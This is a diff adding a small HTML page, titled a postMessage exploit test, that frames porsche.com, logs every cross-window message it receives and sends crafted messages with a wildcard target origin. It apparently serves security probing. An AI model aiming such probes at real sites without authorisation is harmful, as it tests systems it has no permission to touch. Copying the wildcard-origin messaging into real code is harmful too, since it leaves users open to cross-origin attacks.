@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PostMessage Exploit Test</title>
+</head>
+<body>
+    <h1>PostMessage Listener and Exploit</h1>
+    
+    <!-- Embed the target website as an iframe -->
+    <iframe id="targetIframe" src="https://www.porsche.com/" width="1200" height="800"></iframe>
+    <object data="https://www.porsche.com/" width="800" height="600"></object>
+    <script>
+        // Add an event listener to intercept messages sent to this window
+        window.addEventListener("message", (event) => {
+            console.log("Message intercepted:");
+            console.log("Data:", event.data);
+            console.log("Origin:", event.origin);
+            
+            // Optionally, send a crafted response
+            if (event.origin === "https://vulnerable-app.com") {
+                event.source.postMessage({ hacked: true }, event.origin);
+            }
+        });
+
+        // Function to send a test message to the iframe
+        function sendTestMessage() {
+            const iframe = document.getElementById("targetIframe");
+            iframe.contentWindow.postMessage({ test: "disaster!" }, "*"); // '*' allows broadcasting to any origin
+        }
+
+        // Send a test message after a short delay (for the iframe to load)
+        setTimeout(sendTestMessage, 2000);
+        
+    </script>
+</body>
+</html>
